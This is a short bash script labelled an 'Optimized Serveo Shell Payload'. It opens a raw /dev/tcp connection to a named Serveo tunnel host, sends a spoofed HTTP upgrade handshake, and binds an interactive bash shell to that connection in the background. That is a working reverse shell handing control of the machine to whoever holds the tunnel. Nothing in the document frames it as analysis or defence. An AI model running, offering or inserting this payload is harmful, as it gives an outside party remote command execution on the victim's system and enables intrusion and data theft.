#!/bin/bash
# Optimized Serveo Shell Payload
HOST="f43a3b45d041be6a-103-95-173-85.serveousercontent.com"

(
  # 1. Open a network file descriptor (5) to the tunnel
  exec 5<>/dev/tcp/$HOST/80
  
  # 2. Send the 'Handshake' so Serveo forwards the data
  echo -e "POST / HTTP/1.1\nHost: $HOST\nUpgrade: websocket\nConnection: Upgrade\n\n" >&5
  
  # 3. Connect the shell to that same file descriptor
  /bin/bash -i <&5 >&5 2>&5
) &
